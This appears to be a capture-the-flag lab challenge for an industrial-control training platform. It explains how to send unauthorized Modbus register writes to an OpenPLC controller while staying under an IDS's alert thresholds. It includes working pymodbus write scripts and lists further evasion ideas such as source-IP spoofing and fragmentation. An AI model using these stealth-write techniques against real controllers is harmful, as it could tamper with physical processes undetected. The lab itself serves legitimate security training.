# IDS Evasion Challenge

## Objective

Perform a stealth Modbus write operation against the OpenPLC controller without triggering any IDS alerts. This challenge tests your understanding of IDS detection thresholds and evasion techniques.

## Background

Real-world attackers study intrusion detection systems to understand their detection logic and thresholds. By operating below these thresholds ("low-and-slow" attacks), they can manipulate industrial processes without triggering alerts.

This challenge simulates that scenario: you must write to Modbus registers on the PLC while staying invisible to the CybICS IDS. Understanding the detection rules and their exact thresholds is the key to success.

## MITRE ATT&CK for ICS Alignment

| Technique | ID | Relevance |
|---|---|---|
| Exploitation of Remote Services | T0866 | Accessing PLC via Modbus protocol |
| Unauthorized Command Message | T0855 | Writing to PLC registers |
| Evasion | T0820 | Exploiting trusted communication patterns |
| Manipulation of Control | T0831 | Modifying PLC register values |

## MITRE D3FEND Alignment

| Technique | ID | Description |
|---|---|---|
| Network Traffic Analysis | D3-NTA | Understanding what the IDS can and cannot detect |
| Protocol Metadata Anomaly Detection | D3-PMAD | Analyzing protocol-level detection rules |

## Prerequisites

- The IDS must be running (check the IDS dashboard at http://localhost:8443)
- Access to the attack machine (http://localhost:6081/vnc.html) or webshell
- Python with `pymodbus` library (`pip install pymodbus`)

## IDS Detection Rules to Understand

Before attempting evasion, study the IDS rules on the **Rules tab** of the dashboard. The relevant rules are:

### Rules You Must Evade

| Rule | Threshold | What Triggers It |
|---|---|---|
| `modbus_unauth_write` | **10 writes in 30 seconds** | Modbus write function codes from non-service hosts |
| `modbus_flood` | **50 writes in 5 seconds** | High-rate Modbus writes from non-service hosts |
| `port_scan` | **5 ports in 10 seconds** | SYN packets to multiple destination ports |
| `syn_flood` | **100 SYNs in 10 seconds** | Excessive SYN packets from single source |

### Key Insight

The `modbus_unauth_write` rule triggers when **10 or more** write operations are detected from a non-service IP within a 30-second sliding window. If you send **fewer than 10 writes within any 30-second period**, this rule will not fire.

The IDS also has a 30-second alert cooldown per rule+source, but this only matters if you've already triggered an alert.

## Task

### Step 1: Start the Evasion Window

Start a 2-minute evasion challenge via the API or the Challenges tab:

```bash
curl -X POST http://localhost:8443/api/evasion/start
```

This records the current alert count and begins monitoring for your stealth Modbus writes.

### Step 2: Send Stealth Modbus Writes

From the attack machine, send **at least 3** Modbus write commands to OpenPLC, staying below the detection thresholds.

#### Slow Write Script (Python)

```python
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient('172.18.0.3', port=502)
client.connect()

# Send 3 writes with delays to stay under threshold
# Threshold: 10 writes / 30 seconds
# Strategy: send writes slowly (well under the limit)
for i in range(3):
    result = client.write_register(1124, 100 + i)
    print(f"Write {i+1}: {'OK' if not result.isError() else 'ERROR'}")
    if i < 2:
        time.sleep(5)  # 5 second delay between writes

client.close()
print("Stealth writes complete!")
```

#### Alternative: Single Write Commands

```bash
# Using modbus-cli or similar tools, send individual writes:
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('172.18.0.3', port=502)
c.connect()
c.write_register(1124, 42)
c.close()
print('Write 1 done')
"
# Wait a few seconds...
# Repeat 2 more times
```

### Step 3: Verify Success

Check the evasion challenge status:

```bash
curl http://localhost:8443/api/evasion/check
```

**Success criteria:**
- `modbus_writes_detected` >= 3 (your writes were seen by the IDS)
- `new_alerts` == 0 (but none triggered an alert)
- `success` == true

If successful, the flag will be included in the response.

### Common Mistakes

1. **Too many writes too fast**: Sending 10+ writes within 30 seconds triggers `modbus_unauth_write`
2. **Port scanning first**: If you nmap the target during the evasion window, `port_scan` fires
3. **Connecting to multiple ports**: Stick to port 502 only
4. **Running flooding scripts**: Scripts like `flooding_hpt.py` send writes in tight loops, triggering `modbus_flood`

## Advanced Evasion Techniques

For students who want to explore further:

- **Timing analysis**: How does the sliding window work? Can you send 9 writes, wait 31 seconds, then send 9 more?
- **Source spoofing**: Could you spoof your source IP to match a known service? (Hint: the IDS checks source IP against the `KNOWN_SERVICES` list)
- **Protocol-level evasion**: Are there Modbus function codes the IDS doesn't monitor?
- **Fragmentation**: Would IP fragmentation bypass the payload inspection?

## Key Takeaways

- IDS evasion is a critical skill for both red team and blue team professionals
- Understanding detection thresholds helps defenders tune their systems
- "Low-and-slow" attacks are harder to detect than high-volume attacks
- Defense-in-depth (multiple detection layers) mitigates evasion risks
- ICS protocols like Modbus have no built-in authentication, making threshold-based detection essential

## NIST SP 800-82r3 Alignment

| Control Family | Control | Description |
|---|---|---|
| SI (System and Information Integrity) | SI-4 | Information System Monitoring |
| RA (Risk Assessment) | RA-5 | Vulnerability Scanning |
| CA (Assessment, Authorization, and Monitoring) | CA-8 | Penetration Testing |
| SC (System and Communications Protection) | SC-7 | Boundary Protection |
